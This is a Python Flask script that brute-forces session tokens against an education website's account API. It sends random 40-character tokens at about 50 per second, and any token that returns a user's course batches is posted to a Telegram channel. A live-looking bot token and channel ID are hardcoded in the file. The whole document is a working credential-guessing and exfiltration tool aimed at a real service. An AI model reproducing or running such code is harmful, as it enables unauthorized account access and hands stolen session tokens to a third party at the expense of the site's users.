from flask import Flask, jsonify
import random
import string
import requests
from telegram import Bot
import threading
import time
from concurrent.futures import ThreadPoolExecutor

# Initialize Flask app
app = Flask(__name__)

# Telegram Bot setup
TELEGRAM_BOT_TOKEN = '7853203368:AAE801naC4GMeyrkEfyflPItRwMvLmQddPY'
CHANNEL_CHAT_ID = '-1002478793346'  # Replace with your channel ID or username
bot = Bot(token=TELEGRAM_BOT_TOKEN)

# Variables to track token checks
tokens_checked = 0
batches_found = 0

# Function to generate a random 40-character token
def generate_random_token():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=40))

# Function to check a single token
def check_single_token(token):
    global batches_found
    url = "https://spec.iitschool.com/api/v1/my-batch"
    headers = {
        'Accept': 'application/json',
        'origintype': 'web',
        'token': token,
        'usertype': '2',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    try:
        response = requests.get(url, headers=headers, timeout=2)  # Timeout to avoid delays
        if response.status_code == 200:
            data = response.json().get('data', {})
            batch_data = data.get('batchData', [])
            if batch_data:
                batches_found += len(batch_data)
                for batch in batch_data:
                    batch_name = batch.get('batchName', 'N/A')
                    batch_id = batch.get('id', 'N/A')
                    # Send to Telegram
                    send_to_telegram(token, batch_name, batch_id)
    except Exception as e:
        print(f"Error checking token: {e}")

# Function to send progress updates to Telegram
def send_progress_to_telegram(tokens_checked):
    message = f"Progress Update: {tokens_checked} tokens checked so far."
    bot.send_message(chat_id=CHANNEL_CHAT_ID, text=message)

# Function to send a message to the Telegram channel
def send_to_telegram(token, batch_name, batch_id):
    message = f"Token: {token}\n{batch_name} - {batch_id}"
    bot.send_message(chat_id=CHANNEL_CHAT_ID, text=message)

# Function to check tokens in batches of 50 per second
def check_tokens():
    global tokens_checked
    while True:
        tokens = [generate_random_token() for _ in range(50)]  # Generate 50 tokens
        with ThreadPoolExecutor(max_workers=10) as executor:
            executor.map(check_single_token, tokens)  # Multitask token checking
        tokens_checked += 50  # Increment the counter
        send_progress_to_telegram(tokens_checked)  # Send progress update
        time.sleep(1)  # Wait for 1 second

# Health check route (optional for monitoring purposes)
@app.route('/health', methods=['GET'])
def health_check():
    return "OK", 200

# Info route to return bot status
@app.route('/info', methods=['GET'])
def info():
    return jsonify({
        "status": "running",
        "tokens_checked": tokens_checked,
        "batches_found": batches_found,
        "telegram_channel": CHANNEL_CHAT_ID
    })

if __name__ == '__main__':
    # Start the background thread for token checking
    threading.Thread(target=check_tokens, daemon=True).start()
    # Run the Flask app
    app.run(host='0.0.0.0', port=8080)
